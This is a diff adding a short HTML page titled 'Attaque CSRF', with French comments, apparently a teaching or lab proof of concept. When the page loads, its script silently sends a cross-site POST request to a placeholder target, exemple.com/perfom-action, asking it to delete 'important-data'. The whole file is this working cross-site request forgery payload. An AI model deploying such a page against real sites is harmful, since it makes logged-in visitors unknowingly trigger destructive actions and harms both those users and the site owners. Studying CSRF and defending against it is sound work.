@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attaque CSRF</title>
+</head>
+<body>
+  <script>
+
+    window.onload = function sendRequest(){
+      var xhr = new XMLHttpRequest(); //création d'une nouvel objet XMLHttpRequest
+
+      //Initialisation de la requête HTTP en mode POST vers l'URL de l'attaque
+      xhr.open('POST', 'http://exemple.com/perfom-action', true)
+
+      //définition du type de contenu de la requête comme étant un formulaire
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+      //Envoie de la requête avec les données du formulaire
+      xhr.send('action=delete&target=important-data');
+
+    };
+  </script>
+
+</body>
+</html>
